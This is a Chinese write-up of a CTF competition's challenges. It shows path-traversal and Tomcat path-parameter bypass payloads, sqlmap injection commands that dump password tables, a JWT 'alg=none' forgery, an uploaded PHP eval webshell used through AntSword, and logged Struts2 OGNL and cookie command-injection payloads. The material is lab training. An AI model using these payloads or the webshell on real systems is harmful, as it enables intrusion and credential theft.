- [安全牛破阵CTF Writeup](#安全牛破阵ctf-writeup)
  - [Misc](#misc)
    - [1. 最简单签到](#1-最简单签到)
    - [2. 游戏营销](#2-游戏营销)
  - [Web](#web)
    - [3. 安全牛的ERP](#3-安全牛的erp)
    - [4. 最简单的Web安全入门](#4-最简单的web安全入门)
    - [5. 贼牛掰的身份鉴权，还怕在失陷？](#5-贼牛掰的身份鉴权还怕在失陷)
  - [Forensics](#forensics)
    - [6. webshell被删除了](#6-webshell被删除了)
    - [7. 诡异的命令执行](#7-诡异的命令执行)
    - [8. 黯影迷踪](#8-黯影迷踪)
  - [Pentest](#pentest)
    - [9. 激进的开发者](#9-激进的开发者)
    - [10. 小小的挑战](#10-小小的挑战)
    - [11. 遗忘的调试信息](#11-遗忘的调试信息)


# 安全牛破阵CTF Writeup

## Misc
### 1. 最简单签到
一个员工信息管理系统，查看源代码发现：
```js
<script>
        // 管理员备注：第一部分flag在JavaScript控制台
        console.log("System Debug Info:");
        console.log("Part 1 of Flag: flag{fr0nt3nd_");
        console.log("提示：检查其他用户的隐藏信息获取完整flag");
        
        // 存储一些"加密"的敏感数据
        var adminData = {
            masterKey: "U2VjcmV0S2V5XzIwMjQ=", // Base64编码
            debugMode: true,
            hiddenUsers: [42, 47, 50] // 特殊用户ID
        };
        
        // 将数据存储到localStorage（开发调试用）
        localStorage.setItem('debugInfo', JSON.stringify(adminData));
        localStorage.setItem('hint', '检查ID为42的用户信息');
    </script>
```
查看id = 47的console输出flag
![alt text](images/image.png)

### 2. 游戏营销
飞机大战，提示100,000分就给flag。查看源代码发现是canvas游戏，canvas是画画，核心逻辑在以下JS：
```js
/*********飞机大战************/
var width = window.innerWidth > 480 ? 480 : window.innerWidth,
    height = window.innerHeight > 650 ? 650 : window.innerHeight - 20;

var canvas = document.getElementById('canvas');
canvas.width = width;
canvas.height = height;
var ctx = canvas.getContext('2d');
/********定义游戏状态***********/
const PHASE_DOWNLOAD = 1;
const PHASE_READY = 2;
const PHASE_LOADING = 3;
const PHASE_PLAY = 4;
const PHASE_PAUSE = 5;
const PHASE_GAMEOVER = 6;
/**********游戏当前状态************/
var curPhase = PHASE_DOWNLOAD;
var gameScore = 0;
// 所以图片的链接，包括背景图、各种飞机和飞机爆炸图、子弹图等
var imgName = ['background.png', 'game_pause_nor.png', 'm1.png', 'start.png',
    // 敌机1
    ['enemy1.png', 'enemy1_down1.png', 'enemy1_down2.png', 'enemy1_down3.png', 'enemy1_down4.png'],
    // 敌机2
    ['enemy2.png', 'enemy2_down1.png', 'enemy2_down2.png', 'enemy2_down3.png', 'enemy2_down4.png'],
    // 敌机3
    ['enemy3_n1.png', 'enemy3_n2.png', 'enemy3_hit.png', 'enemy3_down1.png', 'enemy3_down2.png', 'enemy3_down3.png',
        'enemy3_down4.png', 'enemy3_down5.png', 'enemy3_down6.png', ],
    // 游戏loading图
    ['game_loading1.png', 'game_loading2.png', 'game_loading3.png', 'game_loading4.png'],
    // 玩家飞机图
    ['hero1.png', 'hero2.png', 'hero_blowup_n1.png', 'hero_blowup_n2.png', 'hero_blowup_n3.png', 'hero_blowup_n4.png']
];
// 存储不同类型的图片
var bg = null,
    pause = null,
    m = null,
    startImg = null,
    enemy1 = [],
    enemy2 = [],
    enemy3 = [],
    gameLoad = [],
    heroImg = [];
// 加载图片的进度
var progress = 1;
/*********加载图片*********/
function download() {
    bg = nImg(imgName[0]);
    pause = nImg(imgName[1]);
    m = nImg(imgName[2]);
    startImg = nImg(imgName[3]);
    for (var i = 0; i < imgName[4].length; i++) {
        enemy1[i] = nImg(imgName[4][i]);
    }
    for (var i = 0; i < imgName[5].length; i++) {
        enemy2[i] = nImg(imgName[5][i]);
    }
    for (var i = 0; i < imgName[6].length; i++) {
        enemy3[i] = nImg(imgName[6][i]);
    }
    for (var i = 0; i < imgName[7].length; i++) {
        gameLoad[i] = nImg(imgName[7][i]);
    }
    for (var i = 0; i < imgName[8].length; i++) {
        heroImg[i] = nImg(imgName[8][i]);
    }

    function nImg(src) {
        var img = new Image();
        img.src = 'img/' + src;
        img.onload = imgLoad;
        return img;
    }
    // 绘制游戏加载进度画面
    function imgLoad() {
        progress += 3;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        var text = progress + '%';
        var tw = ctx.measureText(text).width;
        ctx.font = '60px arial';
        ctx.fillStyle = 'red';
        ctx.lineWidth = '0';
        ctx.strokeStyle = '#888';
        //ctx.strokeText(text,(width-tw)/2,height/2);
        ctx.fillText(text, (width - tw) / 2, height / 2);
        if (progress >= 100) {
            start();
        }
    }
}
download();

/*********开始游戏**************/
function start() {
    curPhase = PHASE_READY;
    canvas.onclick = function () {
        curPhase == PHASE_READY && (curPhase = PHASE_LOADING);
    }
    ctx.fillStyle = '#963';
    ctx.font = '24px arial';
    hero = new Hero();
    gameEngine();
}
/********画背景*******/
function paintBg() {
    var y = 0;

    function paintBg() {
        ctx.drawImage(bg, 0, y);
        ctx.drawImage(bg, 0, y - 852);
        y++ == 852 && (y = 0);
    }
    return paintBg;
}

/**********画game开始图*********/
function paintLogo() {
    ctx.drawImage(startImg, 40, 0);
}
/*******************/
function loading() {
    this.index = 0;

    function loading() {
        this.index % 1 == 0 && ctx.drawImage(gameLoad[index], 0, canvas.height - gameLoad[0].height);
        this.index += 0.5;
        if (this.index > 3) {
            curPhase = PHASE_PLAY;
            this.index = 0;
        }
    }
    return loading;
}
/*********构造hero************/
var hero = null;

function Hero() {
    this.x = (width - heroImg[0].width) / 2; // hero的坐标
    this.y = height - heroImg[0].height;
    this.index = 0; // 用于切换hero的图片
    this.count = 0; // 用于控制hero图片切换的频率
    this.hCount = 0; // 用于控制子弹发射的频率
    this.eCount = 0; // 用于控制敌机出现的频率    
    this.n = 0;
    this.life = 0;
    this.draw = function () {
        this.count++;
        this.hit();
        if (this.index > 4) {
            curPhase = PHASE_GAMEOVER;
            this.index = 5;
        }
        if (this.count % 3 == 0 && this.index <= 1) { // 切换hero的图片
            this.index = this.index == 0 ? 1 : 0;
            this.count = 0;
        }

        ctx.drawImage(heroImg[this.index], this.x, this.y);
        ctx.fillText('SCORE:' + gameScore, 10, 30);

        this.hCount++;
        if (this.hCount % 3 == 0) { // 同时生成三颗子弹
            this.n == 32 && (this.n = 0);
            hullet.push(new Hullet(this.n));
            this.n == 0 && (this.n = -32);;
            hullet.push(new Hullet(this.n));
            this.n == -32 && (this.n = 32);;
            hullet.push(new Hullet(this.n));
            this.hCount = 0;
        }
        this.eCount++;
        if (this.eCount % 8 == 0) { //生成敌机
            liveEnemy.push(new Enemy());
            this.eCount = 0;
        }
    }
    this.hit = function () { //判断是自己是否被击中
        for (var i = 0; i < liveEnemy.length; i++) {
            var d = liveEnemy[i];
            // 敌机与自己的碰撞检测
            var px, py;
            px = this.x <= d.x ? d.x : this.x;
            py = this.y <= d.y ? d.y : this.y;

            // 判断点
            if (px >= this.x && px <= this.x + heroImg[0].width && py >= this.y && py <= this.y + heroImg[0].height &&
                px >= d.x && px <= d.x + d.width && py >= d.y && py <= d.y + d.height) {
                this.life++;
                if (this.life > 30) {
                    if (this.index <= 2) {
                        this.index = 3;
                    }
                    this.index++;
                    this.life = 0;
                }
            }
        }
    }

    function move(e) {
        if (curPhase == PHASE_PLAY || curPhase == PHASE_PAUSE) {
            curPhase = PHASE_PLAY;
            var offsetX = e.offsetX || e.touches[0].pageX;
            var offsetY = e.offsetY || e.touches[0].pageY;
            var w = heroImg[0].width,
                h = heroImg[0].height;
            var nx = offsetX - w / 2,
                ny = offsetY - h / 2;
            nx < 20 - w / 2 ? nx = 20 - w / 2 : nx > (canvas.width - w / 2 - 20) ? nx = (canvas.width - w / 2 - 20) : 0;
            ny < 0 ? ny = 0 : ny > (canvas.height - h / 2) ? ny = (canvas.height - h / 2) : 0;
            hero.x = nx;
            hero.y = ny;
            hero.count = 2;
        }
    }
    // 绑定鼠标移动和手指触摸事件，控制hero移动
    canvas.addEventListener("mousemove", move, false);
    canvas.addEventListener("touchmove", move, false);
    // 鼠标移除时游戏暂停
    canvas.onmouseout = function (e) {
        if (curPhase == PHASE_PLAY) {
            curPhase = PHASE_PAUSE;
        }
    }
}


/**********构造子弹***********/
var hullet = []; // 存储画布中所以子弹的数组

function Hullet(n) {
    this.n = n; // 用于确定是左中右哪一颗子弹
    // 子弹的坐标
    this.mx = hero.x + (heroImg[0].width - m.width) / 2 + this.n;
    this.my = this.n == 0 ? hero.y - m.height : hero.y + m.height;
    this.width = m.width; // 子弹的宽和高
    this.height = m.height;
    this.removable = false; // 标识子弹是否可移除了
}
Hullet.drawHullet = function () {
    for (var i = 0; i < hullet.length; i++) { //在画布上画出所以子弹
        hullet[i].draw();
        if (hullet[i].removable) { // 如果为true就移除这颗子弹
            hullet.splice(i, 1);
        }
    }
}
Hullet.prototype.draw = function () { // 在画布上画子弹
    ctx.drawImage(m, this.mx, this.my);
    this.my -= 20;
    this.mx += this.n == 32 ? 3 : this.n == -32 ? -3 : 0;
    if (this.my < -m.height) { // 如果子弹飞出画布，就标记为可移除
        this.removable = true;
    };
}


/***********构造敌机********/
var liveEnemy = []; // 用于存储画布上的所有敌机

function Enemy() {
    this.n = Math.random() * 20;
    this.enemy = null; // 保存敌机图片的数组
    this.speed = 0; // 敌机的速度
    this.lifes = 2; // 敌机的生命值
    if (this.n < 1) { // 不同大小的敌机随机出现
        this.enemy = enemy3[0];
        this.speed = 2;
        this.lifes = 50;
    } else if (this.n < 6) {
        this.enemy = enemy2[0];
        this.speed = 4;
        this.lifes = 10;
    } else {
        this.enemy = enemy1[0];
        this.speed = 6;
    }
    this.x = parseInt(Math.random() * (canvas.width - this.enemy.width));
    this.y = -this.enemy.height;
    this.width = this.enemy.width;
    this.height = this.enemy.height;
    this.index = 0;
    this.removable = false;
    // 标识敌机是否狗带，若狗带就画它的爆炸图(也就是遗像啦)
    this.die = false;
    this.draw = function () {
        // 处理不同敌机的爆炸图轮番上阵
        if (this.speed == 2) {
            if (this.die) {
                if (this.index < 2) {
                    this.index = 3;
                }
                if (this.index < enemy3.length) {
                    this.enemy = enemy3[this.index++];
                } else {
                    this.removable = true;
                }
            } else {
                this.enemy = enemy3[this.index];
                this.index == 0 ? this.index = 1 : this.index = 0;
            }
        } else if (this.die) {
            if (this.index < enemy1.length) {
                if (this.speed == 6) {
                    this.enemy = enemy1[this.index++];
                } else {
                    this.enemy = enemy2[this.index++];
                }
            } else {
                this.removable = true;
            }
        }
        ctx.drawImage(this.enemy, this.x, this.y);
        this.y += this.speed; // 移动敌机
        this.hit(); //判断是否击中敌机
        if (this.y > canvas.height) { // 若敌机飞出画布，就标识可移除(让你不长眼！)
            this.removable = true;
        }
    }
    this.hit = function () { //判断是否击中敌机
        for (var i = 0; i < hullet.length; i++) {
            var h = hullet[i];
            // 敌机与子弹的碰撞检测，自己体会吧
            if (this.x + this.width >= h.mx && h.mx + h.width >= this.x &&
                h.my + h.height >= this.y && this.height + this.y >= h.my) {
                if (--this.lifes == 0) { // 若生命值为零，标识为死亡
                    this.die = true;
                    // 计分
                    gameScore += this.speed == 6 ? 10 : this.speed == 4 ? 20 : 100;
                }
                h.removable = true; // 碰撞后的子弹标识为可移除
            }
        }
    }
}

function drawEnemy() {
    for (var i = 0; i < liveEnemy.length; i++) {
        if (liveEnemy[i].removable) {
            liveEnemy.splice(i, 1);
        }
    }
    for (var i = 0; i < liveEnemy.length; i++) {
        liveEnemy[i].draw();
    }
}
/*******游戏暂停*******/
function drawPause() {
    ctx.drawImage(pause, (width - pause.width) / 2, (height - pause.height) / 2);
}
//游戏结束
function gameover() {
    if (gameScore > 100000) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "api.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                var response = JSON.parse(xhr.responseText);
                alert(response.message);
            }
        };
        var data = {
            score: gameScore,
        };
        xhr.send(JSON.stringify(data));
    }
    alert("成绩：" + gameScore);
    gameScore = 0;
    curPhase = PHASE_READY;
    hero = null;
    hero = new Hero();
}
/**********游戏主引擎*********/
var pBg = paintBg();
var load = loading();

function gameEngine() {
    switch (curPhase) {
        case PHASE_READY:
            pBg();
            paintLogo();
            break;
        case PHASE_LOADING:
            pBg();
            load();
            break;
        case PHASE_PLAY:
            pBg();
            drawEnemy();
            Hullet.drawHullet();
            hero.draw();
            break;
        case PHASE_PAUSE:
            drawPause();
            break;
        case PHASE_GAMEOVER:
            gameover();
            break;
    }
    //requestAnimationFrame(gameEngine);
}
setInterval(gameEngine, 50);
```

关键点是分数变量，胜利条件在`gameover()`：
```js
var gameScore = 0;
gameScore += this.speed == 6 ? 10 : this.speed == 4 ? 20 : 100;

if (gameScore > 100000) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "api.php", true);
    ...
    xhr.send(JSON.stringify({ score: gameScore }));
}
```

flag来源是api.php POST返回的JSON
```js
var response = JSON.parse(xhr.responseText);
alert(response.message);
```
所以我们只要伪造一次`gameScore > 100000`并调用`gameover`就能拿到flag。在console里输入：
```
gameScore = 100001;
gameover();

```

或者修改js的胜利条件为：
```js
if (gameScore > 1)
```

即可得到flag：
![alt text](images/image-1.png)

## Web

### 3. 安全牛的ERP
提示flag就藏在flag.html中。不过，直接访问它会被拒绝。你能找到绕过限制的路径吗？

直接访问`/flag.html`返回`302 /login.html`。可尝试以下类型的payload：
1. 斜杠/点号
```
/flag.html/
/flag.html/.
/flag.html/..
```
2. 当前/上级目录
```
/./flag.html
/././flag.html
/../flag.html
```
3. URL 编码（点、斜杠）
```
/flag%2ehtml
/flag.html%2f
/flag.html%2F
/%66lag.html
```
4. 大小写混淆
5. 双斜杠/反斜杠
```
/flag.html//
\\flag.html
```
6. 路径拼接（规则匹配缺陷）
```
/login.html/../flag.html
/index.html/../flag.html
```
7. **路径参数（Tomcat / Java ERP 常见）**
```
/flag.html;/
/flag.html;test
/flag.html;jsessionid=1
```
**原理：**`/flag.html;jsessionid=1`是标准的 Java Web / Tomcat 路径参数绕过（Path Parameter / Matrix Parameter Bypass）。`;jsessionid=`是Java Web的老机制，当cookie被禁用时，用URL传session。

安全规则拦截的是`/flag.html`，而Tomcat实际访问的是`flag.html`，`;jsessionid=1`让安全模块和文件解析模块对路径的理解不一致。
- 安全规则往往写成`deny("/flag.html")`，但看到的是`/flag.html;jsessionid=1`，所以未拦截
- Tomcat实际访问时会自动剥离忽略`;jsessionid=`，最终仍然访问到`flag.html`

8. **访问任意静态文件 + `/..;/flag.html`**
```
/1.js/..;/flag.html
```
**原理**：原始请求路径为三段 = `/1.js` + `/..;` + `/flag.html`。在Tomcat解析时，根据Java Servlet规范，`;`后面的内容为path parameter (matrix parameter)，所以在路经计算阶段，Tomcat实际用于定位的是`/1.js/../flag.html`，`;`被忽略用于资源定位，再做路径规范化canonicalization就等价于/`flag.html`。安全拦截器一般检查的是未规范化、未去除path parameter的字符串，所以结果不等于`/flag.html`，不拦截。前面加上`1.js`可以骗过只保护HTML的规则，比如类似`if (path.endsWith(".js") || path.endsWith(".css")) allow;`，在第一次匹配的时候看起来是访问JS所以没触发HTML拦截；使用`..;`而不是`../`，因为`..;`在字符串匹配阶段不那么明显，在tomcat解析阶段会被自动忽略。

经尝试，`/flag.html;jsessionid=1`和`/..;/flag.html`可绕过，获得flag
![alt text](images/image-2.png)


### 4. 最简单的Web安全入门
sql注入点：`/cat.php?id=1`，错误回显表示为MariaDB
跑sqlmap发现Union-based（4列）
```
sqlmap -u "http://175.27.169.122:36100/cat.php?id=1" -p id --dbms=MariaDB --batch --level=3 --risk=2 
```
用UNION爆出当前数据库为photoblog
```
sqlmap -u "http://175.27.169.122:36100/cat.php?id=1" -p id --technique=U --current-db --batch
```
爆photoblog里的表，包含categories, pictures, users
```
sqlmap -u "http://175.27.169.122:36100/cat.php?id=1" -p id --technique=U -D photoblog --tables  --batch 
```
爆users的列，包含id，login和password
```
sqlmap -u "http://175.27.169.122:36100/cat.php?id=1" -p id --technique=U -D photoblog -T users --columns --batch
```
爆id和password值
```
sqlmap -u "http://175.27.169.122:36100/cat.php?id=1" -p id --technique=U -D photoblog -T users -C id,password --dump --batch
```
得到flag:
```
Database: photoblog
Table: users
[2 entries]
+----+---------------------------------------------+
| id | password                                    |
+----+---------------------------------------------+
| 1  | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
| 2  | flag{906623fe-81ef-45d1-a7cd-029b96c1c572}  |
+----+---------------------------------------------+
```

### 5. 贼牛掰的身份鉴权，还怕在失陷？
打开页面随便输入，提示账号haha密码gogogo，登录后发现时普通用户，cookie是JWT。
![alt text](images/image-3.png)
JWT解码后发现是`alg = HS256, role = user`：
![alt text](images/image-4.png)

将签名alg改为none，role改为admin
![alt text](images/image-5.png)

替换Token后得到flag
![alt text](images/image-6.png)

## Forensics

### 6. webshell被删除了
提示tomcat被攻击，找出攻击者残留的痕迹，账号 root 密码 idgfxuxvr2tqekhz

首先登录后确认Tomcat在哪，路径为`/opt/apache-tomcat-8.5.100`
```bash
ps aux | grep tomcat
find / -name catalina.out 2>/dev/null
```

查看log，快速筛选：
```bash
grep -Ei "jsp|cmd=|runtime|getruntime|processbuilder|exec" catalina.out
```
结果为
```
07-Aug-2025 10:25:57.424 INFO [http-nio-8080-exec-7] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:25:57.614 INFO [http-nio-8080-exec-2] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
        java.lang.IllegalArgumentException: Invalid character found in the request target [/manager/html?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%2841093*44628%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29 ]. The valid characters are defined in RFC 7230 and RFC 3986
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:25:57.666 INFO [http-nio-8080-exec-12] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:25:57.716 INFO [http-nio-8080-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:25:57.765 INFO [http-nio-8080-exec-6] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:25:58.015 INFO [http-nio-8080-exec-4] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:25:59.833 INFO [http-nio-8080-exec-12] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [sessionid="'`expr 435481 + 413798 >/tmp/download/435481`'"] that contained an invalid cookie. That cookie will be ignored.
07-Aug-2025 10:26:00.666 INFO [http-nio-8080-exec-14] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:34:47.536 INFO [http-nio-8080-exec-29] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/opt/apache-tomcat-8.5.100/webapps/a.war]
07-Aug-2025 10:34:47.559 INFO [http-nio-8080-exec-29] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/opt/apache-tomcat-8.5.100/webapps/a.war] has finished in [24] ms
07-Aug-2025 10:35:28.886 INFO [http-nio-8080-exec-3] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
        java.lang.IllegalArgumentException: Invalid character found in the request target [/a/login.jsp?testzz[%27testzz%27] ]. The valid characters are defined in RFC 7230 and RFC 3986
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
07-Aug-2025 10:35:31.733 INFO [http-nio-8080-exec-17] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
                at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
                at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
```
可以看到使用了反引号命令注入，攻击路径如下：
- Struts2 OGNL 探测：`/manager/html?...allowStaticMethodAccess...`
- cookie命令执行：`expr 435481 + 413798 >/tmp/download/435481`
- 上传war包，部署恶意war包：`Deploying web application archive [/opt/apache-tomcat-8.5.100/webapps/a.war]`
- 访问JSP：`/a/login.jsp?testzz['testzz']`

检查`/tmp`和`/opt/apache-tomcat-8.5.100/webapps`发现webapps下有一个文件夹`a`只包含META-INF（正常war解包后至少包含JSP/HTML, WEB-INF, classes, lib），说明没有webshell（JSP被删），但是a.war已经部署成功（日志确认）。

查看tomcat工作目录（JSP编译缓存）发现：
```
/opt/apache-tomcat-8.5.100/work/Catalina/localhost/a/org/apache/jsp/
├── login_jsp.java
├── login_jsp.class
├── login_jsp$PAREN_MATCHING.class
```
这意味着攻击者访问过`/a/login.jsp`，即使JSP和war已经被删，tomcat已经把JSP编译成Java + class，编译产物不会自动删除。从JSP编译源码：
```bash
sed -n '1,200p' /opt/apache-tomcat-8.5.100/work/Catalina/localhost/a/org/apache/jsp/login_jsp.java
```
得到源码中的flag：
```
flag{bfdbb3af-dd7f-49db-ac58-5964cb00e3a6}
```

### 7. 诡异的命令执行
文件是一个pcap包，基本思路：HTTP流量 → 利用某个已知CVE/web漏洞 → cat / flag / ls /whoami → flag在响应里。

分析流量包可发现大量请求指向`172.23.3.25:8848`，以及路径`nacos`，利用Nacos Derby数据库实现任意代码执行RCE：
- pcap中`CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(...)`指向RCE成功执行阶段
- pcap中还有服务器返回的系统进程信息：`/bin/bash /opt/nacos/bin/startup.sh -m standalone`，说明攻击者已经成功执行系统命令
- 在一次HTTP Response（JSON）中，服务器直接返回了flag
```json
{
  "code": 200,
  "message": null,
  "data": [
    {
      "B": 0,
      "A": "flag{ffa4dc98-01db-451d-bbfe-3fdf97f875de}"
    }
  ]
}
```

### 8. 黯影迷踪
提示Tomcat服务器遭到入侵，攻击者植入后门，任务是彻底清除所有后台痕迹，获得flag。登陆系统后当前目录有一个`./flagcheck`，检测后门是否仍然存在，如存在则无法提供flag。

首先检查tomcat目录：`/opt/apache-tomcat-8.5.100/webapps`
```bash
ps aux | grep tomcat
```

查看webapps中JSP，没有明显的webshell名称。
```bash
find webapps -type f \( -name "*.jsp" -o -name "*.jspx" \)
```

查看`webapps/a`（非默认webapp）目录发现一个空的`login.jsp`，这可能是一个入侵残留痕迹，删除该webshell
```bash
rm -rf /opt/apache-tomcat-8.5.100/webapps/a
```

查看`webapps/examples`下有一个空的`login.jsp`，删除
```bash
rm -rf /opt/apache-tomcat-8.5.100/webapps/examples/login.jsp
```

查看tomcat配置级后门`conf/`、`lib/`和`bin/`，确认`lib/`干净，`conf/`结构正常，但是有一个`bin/setenv.sh`（非默认配置）。查看`bin/setenv.sh`后发现没有启动注入或命令执行。
```bash
ls -lt lib
ls conf
ls bin
```

查看tomcat配置内容注入，未发现自定义的className等，但是`tomcat-users.xml`中有明文弱口令和manager-script（=可远程部署war）
- `server.xml`的valve/listener
- 用户配置
```bash
grep -R "Valve\|Listener" conf/server.xml
cat conf/tomcat-users.xml
```

查看系统级持久化后门
- cron后门
- systemd服务伪装
- SUID后门
- SSH持久化
```bash
cat /etc/crontab
crontab -l
ls -al /etc/cron.hourly
ls -al /etc/cron.daily
ls -al /etc/cron.weekly
ls -al /etc/cron.d
```
发现一条`* * * * * /var/crash/tomcat`以root每分钟执行任务，路径为`/var/crash/tomcat`

清除后门：删除cron和后门文件
```bash
crontab -r
rm -f /var/crash/tomcat
```

运行`flagcheck`得到flag
![alt text](images/image-7.png)

## Pentest

### 9. 激进的开发者
提示：管理员的开发者是个激进的人——他喜欢尝试最新功能、最短代码、最直接的实现方式。 这种性格在代码里留下了痕迹：一个"极简"的API、几行"高效"的脚本、还有一个"为了方便"留下的后门。 这次不需要绕弯子，用你最直接的方式拿到flag。

随意注册一个账号后登录，有一个POST搜索框。
```http
POST /welcome.php HTTP/1.1

Host: 175.27.169.122:63700
Content-Length: 8
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://175.27.169.122:63700
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://175.27.169.122:63700/welcome.php
Accept-Encoding: gzip, deflate, br
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1769844042; HMACCOUNT=C00F4C17B2F0F77B; JSESSIONID=05883C83E1F39F8588AC52BC55B535CB; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1769845007; PHPSESSID=5e02809cb50b9279806bd8b53df90c88; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzcwMjQ4NDU3MTUwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NzAyNDg0NTd9.MaccswUXleVkQe4r4gHoOeoE051H-9vIGp7lcFOoh9c
Connection: keep-alive
search=1
```

将以上request导出保存为`header.txt`，用sqlmap检查是否存在注入
```
sqlmap -r .\header.txt --batch
```
发现注入点：
```
Parameter: search (POST)
Type: time-based blind
Payload: search=1' AND (SELECT ... SLEEP(5)) ...

Type: UNION query
Payload: search=1' UNION ALL SELECT NULL, CONCAT(...), NULL-- -
```

列出数据库：information_schema、mysql、performance_schema、sys、test和webapphacking。
```
sqlmap -r header.txt --dbs
```

列出webapphacking的tables：users和books。
```
sqlmap -r header.txt -D webapphacking --tables
```

列出users的字段：name、user、address、id和pasword。
```
sqlmap -r header.txt -D webapphacking -T users --columns
```

列出users信息，选择MD5字典爆破
```
sqlmap -r header.txt -D webapphacking -T users --dump
```
得到结果：
```
+----+--------------+------------+----------------+---------------------------------------------+
| id | name         | user       | address        | pasword                                     |
+----+--------------+------------+----------------+---------------------------------------------+
| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |
| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |
| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |
| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 11 | superadmin   | superadmin | superadmin     | 78a5a463271555808a6febef3ccf9e9a (1Qaz2Wsx) |
| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 13 | 1            | 1          | 1              | e10adc3949ba59abbe56e057f20f883e (123456)   |
+----+--------------+------------+----------------+---------------------------------------------+
```
用superadmin/1Qaz2Wsx重新登录，发现文件上传功能。上传webshell:
```php
<?php
@eval($_POST['pass']);
?>
```
蚁剑连接
```
URL: http://175.27.169.122:43988/uploads/shell-1.php
password: pass
```

在`/home/www-data/flag`下找到flag
```
flag{6e0518ca-2bf6-4546-861e-370655956320}
```
![alt text](images/image-8.png)

### 10. 小小的挑战
提示：本轮挑战仅有一个入口点、一个flag，且没有任何提示。要获得flag，你显然需要获取t权限。如何成为getshell完全取决于你的技术 —— 以及系统的配置。 

用dirsearch扫描目录
```bash
dirsearch -u http://175.27.169.122:41084/
```
得到/administrator，访问发现是Joomla
